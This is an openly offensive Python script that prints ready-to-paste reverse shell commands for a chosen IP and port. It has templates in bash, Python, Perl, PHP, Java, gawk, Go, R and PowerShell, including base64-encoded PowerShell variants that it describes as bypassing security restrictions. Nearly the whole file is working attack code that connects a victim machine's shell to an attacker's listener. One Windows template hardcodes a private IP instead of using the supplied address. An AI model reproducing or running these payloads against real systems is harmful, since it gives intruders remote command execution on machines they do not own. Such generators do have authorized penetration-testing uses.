#!/usr/bin/env python3
import argparse
import base64

# Reverse shell templates with descriptions
shells = {
    "bash": {
        "command": "bash -c 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'",
        "description": "Bash reverse shell: Uses bash built-in features to establish a connection. "
                       "Commonly used on Linux systems and relies on TCP connection through bash."
    },
    "python-linux": {
        "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                   "s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
                   "p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "description": "Python reverse shell for Linux: Leverages Python to execute commands on a Unix-based system. "
                       "Requires Python to be installed on the target system."
    },
    "python-windows": {
        "command": "python.exe -c \"import socket,os,threading,subprocess as sp;"
                   "p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);"
                   "s=socket.socket();s.connect(('192.168.1.87',{port}));"
                   "threading.Thread(target=exec,args=(\\\"while(True):o=os.read(p.stdout.fileno(),1024);"
                   "s.send(o)\\\",globals()),daemon=True).start();"
                   "threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);"
                   "os.write(p.stdin.fileno(),i)\\\",globals())).start()\"",
        "description": "Python reverse shell for Windows: Utilizes Python to open a reverse shell on a Windows system. "
                       "It interacts with `cmd.exe` and relies on Python and socket communication."
    },
    "perl": {
        "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                   "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                   "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "description": "Perl reverse shell: A lightweight option using Perl to spawn a shell. Useful on systems "
                       "with Perl pre-installed (commonly found on Unix systems)."
    },
    "php-linux": {
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "description": "PHP reverse shell for Linux: Uses PHP's `fsockopen()` to connect to the listener. Ideal "
                       "for exploiting web applications running on Linux servers with PHP."
    },
    "php-windows": {
        "command": "php -r \"$sock=fsockopen(\\\"{ip}\\\",{port});$proc=proc_open(\\\"cmd.exe\\\", "
                   "[[0, $sock],[1, $sock],[2, $sock]], $pipes);\"",
        "description": "PHP reverse shell for Windows: Similar to the Linux version but targets Windows systems "
                       "by invoking `cmd.exe` through PHP's `proc_open()`."
    },
    "java": {
        "command": "r = Runtime.getRuntime()"
                   "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])",
        "description": "Java reverse shell: Leverages Java's Runtime and Process to open a shell. Requires Java "
                       "to be installed on the target system. Primarily used on systems with JVM installed."
    },
    "awk": {
        "command": "gawk 'BEGIN {{ s = \"/inet/tcp/0/{ip}/{port}\"; while (42) {{ do {{ printf \"shell> \" |& s; s |& getline c; if (c) {{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while (c != \"exit\"); close(s); }} }}'",
        "description": "AWK reverse shell: A minimalist option for systems where AWK is present (usually on Unix-like systems). "
                       "Uses AWK to establish a reverse shell over TCP."
    },
    "go": {
        "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/a.go && go run /tmp/a.go && rm /tmp/a.go",
        "description": "Go reverse shell: Uses Golang to compile and run a reverse shell. Requires Go to be installed "
                       "on the target system. Useful for quickly creating executable reverse shells."
    },
    "r": {
        "command": "R -e \"c<-socketConnection(host='{ip}',{port},blocking=TRUE,timeout=1000000);while(TRUE){{writeLines(readLines(pipe(readLines(c,1))),c)}}\"",
        "description": "R reverse shell: Utilizes R's `socketConnection()` to establish a reverse shell. "
                       "Suitable for environments where R is available (commonly used in data science/analytics)."
    },
    "powershell1": {
        "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command {{"
                   "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
                   "$stream = $client.GetStream();"
                   "[byte[]]$bytes = 0..65535 | %{{0}};"
                   "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{"
                   "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);"
                   "$sendback = (iex \". {{ $data }} 2>&1\" | Out-String);"
                   "$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';"
                   "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                   "$stream.Write($sendbyte, 0, $sendbyte.Length);"
                   "$stream.Flush() }};"
                   "$client.Close() }}",
        "description": "PowerShell reverse shell (Method 1): Uses PowerShell's TCPClient to communicate over the network. "
                       "The shell opens with `iex` (Invoke-Expression) for command execution. Suitable for Windows environments."
    },
    "powershell2": {
        "command": "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});"
                   "$NetworkStream = $TCPClient.GetStream();"
                   "$StreamWriter = New-Object IO.StreamWriter($NetworkStream);"
                   "[byte[]]$Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};"
                   "$StreamWriter.Write('SHELL> '); $StreamWriter.Flush();"
                   "while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{"
                   "$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
                   "$Output = try {{ Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $_ | Out-String }};"
                   "$StreamWriter.Write($Output + 'SHELL> '); $StreamWriter.Flush() }};"
                   "$StreamWriter.Close()",
        "description": "PowerShell reverse shell (Method 2): Similar to Method 1 but streams input/output via a `StreamWriter`. "
                       "Handles command output more explicitly. Ideal for more controlled environments."
    },
    "powershell3": {
        "command": "powershell -nop -w hidden -noni -ep bypass -enc {payload}",
        "description": "PowerShell reverse shell (Encoded): Base64-encoded payload for bypassing certain security restrictions. "
                       "Suitable for stealthier operations on Windows systems."
    },
    "powershell4": {
        "command": "powershell -w hidden -enc {payload}",
        "description": "PowerShell reverse shell (Minimal Encoded): A lighter version of the encoded PowerShell reverse shell. "
                       "Removes some flags but still encodes the payload to bypass defenses."
    }
}

def generate_powershell_base64(ip, port):
    payload_code = (
        "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};"
        "$client.Close()"
    ).format(ip=ip, port=port)
    return base64.b64encode(payload_code.encode('utf-16le')).decode()

def colorize(text, color):
    colors = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'magenta': '\033[95m',
        'cyan': '\033[96m',
        'white': '\033[97m',
        'reset': '\033[0m'
    }
    return f"{colors.get(color, colors['reset'])}{text}{colors['reset']}"

def display_shell_types():
    for shell_type, shell_info in shells.items():
        print(colorize(f"{shell_type}:", 'blue'))
        print(colorize(f"{shell_info['description']}\n", 'green'))

def main():
    parser = argparse.ArgumentParser(description='Generate reverse shell scripts.')
    parser.add_argument('--ip', type=str, required=True, help='IP address of the listener.')
    parser.add_argument('--port', type=int, required=True, help='Port of the listener.')
    parser.add_argument('--type', type=str, choices=shells.keys(), required=True, help='Type of reverse shell.')
    parser.add_argument('--list-shells', action='store_true', help='List available shell types with descriptions.')

    args = parser.parse_args()

    if args.list_shells:
        display_shell_types()
        return

    # Generate the shell code
    if args.type in ["powershell3", "powershell4"]:
        encoded_payload = generate_powershell_base64(args.ip, args.port)
        shell_code = shells[args.type]['command'].format(payload=encoded_payload)
    else:
        shell_code = shells[args.type]['command'].format(ip=args.ip, port=args.port)

    # Output the shell
    print(colorize(f"Reverse Shell Type: {args.type}", 'blue'))
    print(colorize("\nShell Code:\n", 'cyan'))
    print(colorize(shell_code, 'yellow'))

if __name__ == '__main__':
    main()
